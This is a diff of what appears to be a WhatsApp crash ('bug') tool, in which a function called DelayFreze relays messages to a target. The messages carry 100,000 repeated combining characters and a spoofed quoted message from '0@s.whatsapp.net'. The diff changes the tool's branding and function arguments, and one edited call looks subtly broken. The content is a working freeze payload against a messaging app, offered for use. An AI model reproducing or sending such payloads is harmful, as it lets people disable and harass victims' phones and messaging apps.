@@ -3477,7 +3477,7 @@ async function BuritMambu(sock, target) {
 }
 
 //New Func 06-10-2026
-async function DelayFreze(target) {
+async function DelayFreze(sock, target) {
 await sock.relayMessage(target, {
   groupStatusMessageV2: {  
     message: {
@@ -3525,12 +3525,12 @@ await sock.relayMessage(target, {
           }
       }, { participant: { jid: target }});    
 
-      sock.relayMessage(target, {
+      sock.relayMessage(sock, target, {
           extendedTextMessage: {
-            text: "RΛ‌Ν‌Ѕ ‌‌- T‌ΞϾ‌H" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
+            text: "STRAVAS ‌‌- T‌ΞϾ‌H" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
             contextInfo: {
               fromMe: false,
-              stanzaId: ransxd.generateMessageTag(),
+              stanzaId: stravas.generateMessageTag(),
               participant: "0@s.whatsapp.net",
               mentionedJid: [github],
               quotedMessage: {
